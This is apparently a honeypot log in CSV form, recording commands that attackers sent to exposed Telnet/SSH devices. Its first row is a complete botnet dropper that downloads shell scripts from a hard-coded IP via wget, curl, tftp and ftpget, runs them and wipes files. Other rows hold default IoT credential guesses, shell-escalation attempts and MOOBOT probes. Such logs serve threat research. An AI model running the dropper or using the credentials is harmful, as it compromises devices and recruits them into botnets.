id,command,connection_id
30981,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.168.190.82/8UsA.sh; curl -O http://104.168.190.82/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 104.168.190.82 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 104.168.190.82; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.168.190.82 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *",356110
30982,sh,356110
30983,enable,356217
30984,system,356217
30985,shell,356217
30986,sh,356217
30987,enable,356219
30988,system,356219
30989,shell,356219
30990,sh,356219
30991,enable,356302
30992,system,356302
30993,shell,356302
30994,sh,356302
30995,enable,356307
30996,system,356307
30997,shell,356307
30998,sh,356307
30999,enable,356323
31000,system,356323
31001,shell,356323
31002,sh,356323
31003,enable,356377
31004,system,356377
31005,shell,356377
31006,sh,356377
31007,enable,356488
31008,system,356488
31009,shell,356488
31010,sh,356488
31011,enable,356533
31012,system,356533
31013,shell,356533
31014,sh,356533
31015,enable,356632
31016,system,356632
31017,shell,356632
31018,sh,356632
31019,enable,356639
31020,system,356639
31021,shell,356639
31022,sh,356639
31023,enable,356664
31024,system,356664
31025,shell,356664
31026,sh,356664
31027,enable,356686
31028,system,356686
31029,shell,356686
31030,sh,356686
31031,enable,356715
31032,system,356715
31033,shell,356715
31034,sh,356715
31035,enable,356739
31036,system,356739
31037,shell,356739
31038,sh,356739
31039,root,356832
31040,anko,356832
31041,admin,356832
31042,enable,356833
31043,system,356833
31044,shell,356833
31045,sh,356833
31046,enable,356836
31047,system,356836
31048,shell,356836
31049,sh,356836
31050,enable,356845
31051,system,356845
31052,shell,356845
31053,sh,356845
31054,enable,356897
31055,system,356897
31056,shell,356897
31057,sh,356897
31058,enable,356903
31059,system,356903
31060,shell,356903
31061,sh,356903
31062,enable,356938
31063,system,356938
31064,shell,356938
31065,sh,356938
31066,start,356964
31067,enable,356964
31068,"config terminal",356964
31069,system,356964
31070,sh,356969
31071,shell,356969
31072,sh,356970
31073,sh,356971
31074,sh,356972
31075,shell,356971
31076,sh,356973
31077,shell,356970
31078,sh,356974
31079,shell,356972
31080,sh,356975
31081,sh,356976
31082,sh,356978
31083,shell,356973
31084,sh,356979
31085,sh,356980
31086,shell,356975
31087,sh,356984
31088,sh,356985
31089,sh,356986
31090,shell,356974
31091,sh,356987
31092,shell,356979
31093,sh,356988
31094,shell,356976
31095,shell,356980
31096,sh,356991
31097,sh,356992
31098,sh,356993
31099,shell,356978
31100,sh,356995
31101,sh,356996
31102,shell,356984
31103,shell,356985
31104,shell,356986
31105,shell,356988
31106,shell,356987
31107,shell,356992
31108,shell,356991
31109,shell,356993
31110,shell,356995
31111,shell,356996
31112,enable,357107
31113,system,357107
31114,shell,357107
31115,sh,357107
31116,enable,357118
31117,system,357118
31118,shell,357118
31119,sh,357118
31120,enable,357139
31121,system,357139
31122,shell,357139
31123,sh,357139
31124,enable,357185
31125,system,357185
31126,shell,357185
31127,sh,357185
31128,enable,357200
31129,system,357200
31130,shell,357200
31131,sh,357200
31132,enable,357299
31133,system,357299
31134,shell,357299
31135,sh,357299
31136,enable,357326
31137,system,357326
31138,shell,357326
31139,sh,357326
31140,enable,357347
31141,system,357347
31142,shell,357347
31143,sh,357347
31144,enable,357354
31145,system,357354
31146,shell,357354
31147,sh,357354
31148,enable,357355
31149,system,357355
31150,shell,357355
31151,enable,357356
31152,sh,357355
31153,system,357356
31154,shell,357356
31155,sh,357356
31156,enable,357357
31157,system,357357
31158,shell,357357
31159,sh,357357
31160,enable,357358
31161,system,357358
31162,shell,357358
31163,sh,357358
31164,enable,357359
31165,enable,357360
31166,system,357359
31167,system,357360
31168,shell,357359
31169,shell,357360
31170,enable,357361
31171,system,357361
31172,shell,357361
31173,sh,357361
31174,enable,357362
31175,development,357362
31176,shell,357362
31177,sh,357362
31178,enable,357363
31179,system,357363
31180,shell,357363
31181,sh,357363
31182,enable,357411
31183,system,357411
31184,shell,357411
31185,sh,357411
31186,enable,357435
31187,system,357435
31188,shell,357435
31189,sh,357435
31190,enable,357436
31191,system,357436
31192,shell,357436
31193,sh,357436
31194,enable,357437
31195,system,357437
31196,shell,357437
31197,enable,357697
31198,system,357697
31199,shell,357697
31200,sh,357697
31201,enable,357698
31202,system,357698
31203,shell,357698
31204,sh,357698
31205,enable,357747
31206,system,357747
31207,shell,357747
31208,sh,357747
31209,root,357783
31210,cat1029,357783
31211,guest,357783
31212,12345,357783
31213,root,357784
31214,1234qwer,357784
31215,root,357784
31216,oelinux123,357784
31217,enable,357785
31218,system,357785
31219,shell,357785
31220,sh,357785
31221,enable,357798
31222,system,357798
31223,shell,357798
31224,sh,357798
31225,enable,357835
31226,system,357835
31227,shell,357835
31228,sh,357835
31229,enable,357836
31230,system,357836
31231,shell,357836
31232,sh,357836
31233,enable,357983
31234,system,357983
31235,shell,357983
31236,sh,357983
31237,enable,358301
31238,system,358301
31239,shell,358301
31240,sh,358301
31241,enable,358313
31242,system,358313
31243,shell,358313
31244,sh,358313
31245,enable,358317
31246,system,358317
31247,enable,358318
31248,shell,358317
31249,system,358318
31250,enable,358414
31251,system,358414
31252,shell,358414
31253,sh,358414
31254,enable,358428
31255,system,358428
31256,shell,358428
31257,sh,358428
31258,enable,358440
31259,system,358440
31260,shell,358440
31261,sh,358440
31262,enable,358685
31263,system,358685
31264,shell,358685
31265,sh,358685
31266,enable,358687
31267,system,358687
31268,shell,358687
31269,sh,358687
31270,enable,358689
31271,system,358689
31272,shell,358689
31273,sh,358689
31274,enable,358884
31275,system,358884
31276,shell,358884
31277,sh,358884
31278,enable,358961
31279,system,358961
31280,shell,358961
31281,sh,358961
31282,enable,359230
31283,system,359230
31284,shell,359230
31285,sh,359230
31286,enable,359533
31287,system,359533
31288,shell,359533
31289,sh,359533
31290,enable,359575
31291,system,359575
31292,shell,359575
31293,sh,359575
31294,enable,359576
31295,system,359576
31296,shell,359576
31297,sh,359576
31298,enable,359578
31299,system,359578
31300,shell,359578
31301,sh,359578
31302,enable,359588
31303,system,359588
31304,shell,359588
31305,sh,359588
31306,enable,359636
31307,system,359636
31308,shell,359636
31309,sh,359636
31310,enable,359670
31311,system,359670
31312,shell,359670
31313,sh,359670
31314,enable,359671
31315,system,359671
31316,shell,359671
31317,sh,359671
31318,"/bin/busybox MOOBOT",359672
31319,enable,359686
31320,system,359686
31321,shell,359686
31322,sh,359686
31323,"/bin/busybox MOOBOT",359695
31324,enable,359758
31325,system,359758
31326,shell,359758
31327,sh,359758
31328,enable,359810
31329,system,359810
31330,shell,359810
31331,sh,359810
31332,enable,359813
31333,system,359813
31334,shell,359813
31335,sh,359813
31336,enable,359814
31337,system,359814
31338,shell,359814
31339,sh,359814
31340,enable,359815
31341,system,359815
31342,shell,359815
31343,sh,359815
31344,enable,359848
31345,system,359848
31346,shell,359848
31347,sh,359848
31348,enable,359931
31349,system,359931
31350,shell,359931
31351,sh,359931
31352,enable,359932
31353,system,359932
31354,shell,359932
31355,sh,359932
31356,enable,360018
31357,system,360018
31358,shell,360018
31359,sh,360018
31360,enable,360021
31361,system,360021
31362,shell,360021
31363,sh,360021
31364,enable,360022
31365,system,360022
31366,shell,360022
31367,sh,360022
31368,enable,360023
31369,system,360023
31370,shell,360023
31371,sh,360023
31372,enable,360027
31373,system,360027
31374,shell,360027
31375,sh,360027
31376,enable,360028
31377,system,360028
31378,shell,360028
31379,sh,360028
31380,enable,360077
31381,system,360077
31382,shell,360077
31383,sh,360077
31384,enable,360132
31385,system,360132
31386,shell,360132
31387,sh,360132
31388,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",360135
31389,"Accept-Encoding: gzip, deflate, br",360135
31390,"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",360135
31391,"Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3",360135
31392,"%-12345X@PJL INFO ID",360136
31393,"%-12345X",360136
31394,enable,360142
31395,system,360142
31396,shell,360142
31397,sh,360142
31398,enable,360145
31399,system,360145
31400,shell,360145
31401,sh,360145
31402,enable,360146
31403,system,360146
31404,shell,360146
31405,sh,360146
31406,enable,360147
31407,system,360147
31408,shell,360147
31409,sh,360147
31410,enable,360155
31411,system,360155
31412,shell,360155
31413,sh,360155
31414,enable,360257
31415,system,360257
31416,shell,360257
31417,sh,360257
31418,enable,360279
31419,system,360279
31420,shell,360279
31421,sh,360279
31422,enable,360281
31423,system,360281
31424,shell,360281
31425,sh,360281
31426,enable,360283
31427,system,360283
31428,shell,360283
31429,sh,360283
31430,enable,360285
31431,system,360285
31432,shell,360285
31433,sh,360285
31434,enable,360287
31435,system,360287
31436,shell,360287
31437,sh,360287
31438,enable,360289
31439,system,360289
31440,shell,360289
31441,sh,360289
31442,enable,360291
31443,system,360291
31444,shell,360291
31445,sh,360291
31446,enable,360293
31447,system,360293
31448,shell,360293
31449,sh,360293
31450,enable,360296
31451,system,360296
31452,shell,360296
31453,sh,360296
31454,enable,360299
31455,system,360299
31456,shell,360299
31457,sh,360299
31458,enable,360302
31459,system,360302
31460,shell,360302
31461,sh,360302
31462,enable,360306
31463,system,360306
31464,shell,360306
31465,sh,360306
31466,enable,360309
31467,system,360309
31468,shell,360309
31469,sh,360309
31470,enable,360312
31471,system,360312
31472,shell,360312
31473,sh,360312
31474,enable,360315
31475,system,360315
31476,shell,360315
31477,sh,360315
31478,enable,360318
31479,system,360318
31480,shell,360318
31481,sh,360318
31482,enable,360321
31483,system,360321
31484,shell,360321
31485,sh,360321
31486,enable,360324
31487,system,360324
31488,shell,360324
31489,sh,360324
31490,enable,360327
31491,system,360327
31492,shell,360327
31493,sh,360327
31494,enable,360330
31495,system,360330
31496,shell,360330
31497,sh,360330
31498,enable,360333
31499,system,360333
31500,shell,360333
31501,sh,360333
31502,enable,360336
31503,system,360336
31504,shell,360336
31505,sh,360336
31506,enable,360339
31507,system,360339
31508,shell,360339
31509,sh,360339
31510,enable,360343
31511,system,360343
31512,shell,360343
31513,sh,360343
31514,enable,360346
31515,system,360346
31516,shell,360346
31517,sh,360346
31518,enable,360349
31519,system,360349
31520,shell,360349
31521,sh,360349
31522,enable,360352
31523,system,360352
31524,shell,360352
31525,enable,360353
31526,sh,360352
31527,system,360353
31528,shell,360353
31529,enable,360356
31530,sh,360353
31531,enable,360357
31532,system,360356
31533,system,360357
31534,shell,360356
31535,shell,360357
31536,sh,360356
31537,enable,360360
31538,sh,360357
31539,system,360360
31540,shell,360360
31541,sh,360360
31542,enable,360363
31543,system,360363
31544,shell,360363
31545,sh,360363
31546,enable,360366
31547,system,360366
31548,shell,360366
31549,sh,360366
31550,enable,360369
31551,system,360369
31552,shell,360369
31553,sh,360369
31554,enable,360372
31555,system,360372
31556,shell,360372
31557,sh,360372
31558,enable,360375
31559,system,360375
31560,shell,360375
31561,sh,360375
31562,enable,360378
31563,system,360378
31564,shell,360378
31565,sh,360378
31566,enable,360381
31567,system,360381
31568,shell,360381
31569,sh,360381
31570,enable,360384
31571,system,360384
31572,shell,360384
31573,sh,360384
31574,enable,360387
31575,system,360387
31576,shell,360387
31577,sh,360387
31578,enable,360390
31579,system,360390
31580,shell,360390
31581,sh,360390
31582,enable,360393
31583,system,360393
31584,shell,360393
31585,sh,360393
31586,enable,360397
31587,system,360397
31588,shell,360397
31589,sh,360397
31590,enable,360401
31591,system,360401
31592,shell,360401
31593,sh,360401
31594,enable,360405
31595,system,360405
31596,shell,360405
31597,sh,360405
31598,enable,360409
31599,system,360409
31600,shell,360409
31601,sh,360409
31602,enable,360412
31603,system,360412
31604,shell,360412
31605,sh,360412
31606,enable,360415
31607,system,360415
31608,shell,360415
31609,sh,360415
31610,enable,360418
31611,system,360418
31612,shell,360418
31613,sh,360418
31614,enable,360421
31615,system,360421
31616,shell,360421
31617,sh,360421
31618,enable,360425
31619,system,360425
31620,shell,360425
31621,sh,360425
31622,enable,360428
31623,system,360428
31624,shell,360428
31625,sh,360428
31626,enable,360431
31627,system,360431
31628,shell,360431
31629,sh,360431
31630,enable,360436
31631,system,360436
31632,shell,360436
31633,sh,360436
31634,enable,360439
31635,system,360439
31636,shell,360439
31637,sh,360439
31638,enable,360442
31639,system,360442
31640,shell,360442
31641,sh,360442
31642,enable,360445
31643,system,360445
31644,shell,360445
31645,sh,360445
31646,enable,360576
31647,enable,360577
31648,enable,360578
31649,system,360576
31650,system,360577
31651,system,360578
31652,shell,360577
31653,shell,360576
31654,sh,360577
31655,shell,360578
31656,sh,360576
31657,sh,360578
31658,enable,360606
31659,system,360606
31660,shell,360606
31661,sh,360606
31662,enable,360607
31663,system,360607
31664,shell,360607
31665,sh,360607
31666,enable,360610
31667,system,360610
31668,shell,360610
31669,sh,360610
31670,enable,360666
31671,system,360666
31672,shell,360666
31673,sh,360666
31674,enable,360679
31675,system,360679
31676,shell,360679
31677,sh,360679
31678,enable,360686
31679,system,360686
31680,shell,360686
31681,enable,360730
31682,system,360730
31683,shell,360730
31684,sh,360730
31685,enable,360841
31686,system,360841
31687,shell,360841
31688,sh,360841
31689,enable,360909
31690,system,360909
31691,shell,360909
31692,sh,360909
31693,enable,360912
31694,system,360912
31695,shell,360912
31696,sh,360912
31697,shell,360932
